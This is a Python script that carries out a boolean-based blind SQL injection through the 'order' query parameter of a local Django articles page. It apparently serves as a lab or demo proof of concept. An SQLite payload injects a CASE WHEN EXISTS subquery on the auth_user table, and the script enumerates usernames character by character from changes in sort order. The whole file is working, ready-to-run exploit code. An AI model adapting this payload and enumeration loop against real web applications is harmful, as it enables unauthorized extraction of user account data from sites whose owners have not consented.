import requests, string
from bs4 import BeautifulSoup

# We assume that all usernames are lowercase and don't have any special characters.
CHARS = string.ascii_lowercase + string.digits

BASE_URL = 'http://localhost:8000/articles/?order='

# If a given username exists in the auth_user table, sort results by author (ascending). 
# Otherwise, sort by article's title (ascending).
PAYLOAD = {
    'sqlite': '("."),(case when exists(select 1 from auth_user u where u.username like \'{username}%\') then author else title end) asc; -- ',
    'mysql': '',
    'postgresql': '',
}

# Expected output if table is sorted by author's name (ascending).
EXPECTED_OUTCOME = ['Anakin Skywalker', 'Sun Tzu Dev', 'Zed']

def extract_column_values(html_doc, col_idx):
    '''
    Extracts column's (identified by col_idx) values from the HTML table.
    '''
    data = []

    bs = BeautifulSoup(html_doc, 'html.parser')
    table_body = bs.find('tbody')
    rows = table_body.find_all('tr')
    for row in rows:
        data.append(row.find_all('td')[col_idx].text)

    return data

def phrase_found_in_users_table(phrase):
    response = requests.get(BASE_URL + PAYLOAD['sqlite'].format(username=phrase))
    # 'Author' column has idx = 1.
    return extract_column_values(response.text, 1) == EXPECTED_OUTCOME

def search_for_username(phrase):
    if phrase_found_in_users_table(phrase):
        username = phrase
        for char in CHARS:
            result = search_for_username(username + char)
            if result:
                username = result
        return username
    else:
        return None
        
if __name__ == '__main__':
    print('[*] Searching for users...')
    for char in CHARS:
        username = search_for_username(char)
        if username:
            print(username)